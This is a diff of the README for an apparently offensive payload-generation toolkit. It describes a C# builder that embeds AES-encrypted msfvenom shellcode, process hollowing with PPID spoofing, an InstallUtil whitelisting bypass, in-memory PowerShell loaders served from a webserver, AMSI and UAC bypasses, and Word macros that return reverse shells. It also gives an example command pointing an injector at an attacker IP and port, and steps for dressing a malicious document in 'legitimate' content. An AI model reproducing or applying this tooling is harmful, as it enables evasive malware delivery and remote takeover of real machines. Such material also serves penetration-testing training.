@@ -44,7 +44,9 @@ uacbypass.ps1 - UAC bypass using FODhelper to elevate priviliges on a user accou
   
 
 # NOTES
-D_invoke: This is a package built using TheWover's project and research as the foundation (https://github.com/TheWover/DInvoke, https://thewover.github.io/Dynamic-Invoke/).
+D_invoke: 
+
+This is a package built using TheWover's project and research as the foundation (https://github.com/TheWover/DInvoke, https://thewover.github.io/Dynamic-Invoke/).
 
 The inspiration for this project was to simplify the process of generating compled C# payloads.  Using this project the user never need open visual studio.
 
@@ -67,10 +69,21 @@ Architecture (x86, x64)
 
 After the user specifies all the above options, a "template.cs" file within the selected format project (exe, dll, service) will be edited and the payload pieced together.  Builder.exe has hardcoded within it the necessary code for the various options (d/invoke statements for hollowing w/ ppid spoofing for example) that will be placed into the template file in the proper manner in the given format (exe, dll, service exe).  Builder will AES-256 encrypt the shellcode (generating a new key and IV each time it is run) and embed the encrypted shellcode within the template file. Once the template file is complete, it will be saved over program.cs in the respective format project.  MSBuild will the be called on the updated program.cs file in order to create the final payload in exe, dll, or service exe format.
 
-The produced payloads use D/invoke statements for most, but not all of the API calls. Certain simple ones (As well as certain complex ones in the process hollowing payload) still use p/invoke.  Additionally direct syscalls have not been implemented in this project... It is maybe a direction for further work however given that certain EDR's don't even hook userland syscalls anymore, I haven't done this yet as I need to do more research on the correct direction to go in the future. 
+The produced payloads use D/invoke statements for most, but not all of the API calls. Certain simple ones (As well as certain complex ones in the process hollowing payload) still use p/invoke. An Installutil bypass is baked into each payload for use in case application whitelisting is in place. Additionally direct syscalls have not been implemented in this project... It is maybe a direction for further work however given that certain EDR's don't even hook userland syscalls anymore, I haven't done this yet as I need to do more research on the correct direction to go in the future. 
 
 Note that this tool was developed for personal use, not production.  As such there are some shortcomings in that there are hardcoded paths where Builder.exe expects to find things. Builder.exe should only be run from within the d/invoke folder (i.e. builder.exe should be in the same folder as the dll, exe, and service folders as it is on the hosted repo).  Additionally MSBuild is hardcoded for VS2019. If you are utilizing a different version, you will need to edit the source code of Builder.exe and update it with the path to MSBuild within your version.
   
+Powerinject.py and Powerhollow.py:
+
+These python scripts call msfvenom to generate shellcode, AES encrypt it, and then embed it within hardcoded powershell code in order to dynamically produce .PS1 payloads according to user supplied options.  These .PS1 payloads are modeled after the OSEP .PS1 that utilizes dynamic lookup rather than add-type in order to prevent writing to disk when calling csc.  Powerinject.py payloads succeed here; however I was unable to find a way to define the structs necessary for doing PPID spoofing with Process hollowing, so add-type IS called in the Powerhollow .PS1 payloads, however this is only done for the necessesary structs and the createprocess Win32API, all other required API's are resolved dynamically.
+
+Run the appropriate python script for the kind of payload you want to use and then place the produced files in your webserver directory and use the supplied PS one liner in order to call them.
+
+Clinject and Clhollow:
+
+These are C# projects that have been modified in order to accept command line Lhost, Lport, and processes for targeting.  This allows a user to drop the payload on whatever target machine without worry of needing to re-roll shellcode if the attackers IP changes, or the payload needs to be pointed at a different machine in order to hit a tunnel and egress the network. 
+
+Example usage: clinject.exe 192.168.1.1 443 explorer
   
 Powershell AMSI bypass:
   
@@ -101,7 +114,7 @@ Hollowing tools:
   
   WordMacroRunner - This is a baseline runner that will return a shell from WINWORD.exe. Has capabilities to detect AMSI and patch it if found (for both 32bit and 64 bit) as well as contains shellcode for both 32bit and 64 bit Word so it can execute after detecting architecture. 
   
-  WordMacroInject - This macro performs process injection.  Currently specified for explorer.exe. NOTE: This runner is really only good for 64-bit word.  Seeing as we have no idea what version of word an organization will be running, the use case for this is limited.  The issue stems from the fact that 32 bit processes cannot easily inject into 64 bit ones; The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossibly.  There are advanced techniques out there that might be able to facilitate this (Heaven's gate) but no idea if they could be implemented in VBA. Additionally there is no telling what/if any other 32 bit processes suitable for injetion might be running on a target machine.  In theory code could be written to enumerate running 32 bit processes and then just try to inject into an arbitrary one, but there are obvious issues concerning stability, and longevity of the process to maintain a reverse shell.  In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.
+  WordMacroInject - This macro performs process injection.  Currently specified for explorer.exe. NOTE: This runner is really only good for 64-bit word.  Seeing as we have no idea what version of word an organization will be running, the use case for this is limited.  The issue stems from the fact that 32 bit processes cannot easily inject into 64 bit ones; The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossibly.  There are advanced techniques out there that might be able to facilitate this (Heaven's gate) but no idea if they could be implemented in VBA. Additionally there is no telling what/if any other 32 bit processes suitable for injection might be running on a target machine.  In theory code could be written to enumerate running 32 bit processes and then just try to inject into an arbitrary one, but there are obvious issues concerning stability, and longevity of the process to maintain a reverse shell.  In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.
   
   Setup/formatting information:
   1. Write "legitimate" contents of the word doc, select all, then navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery
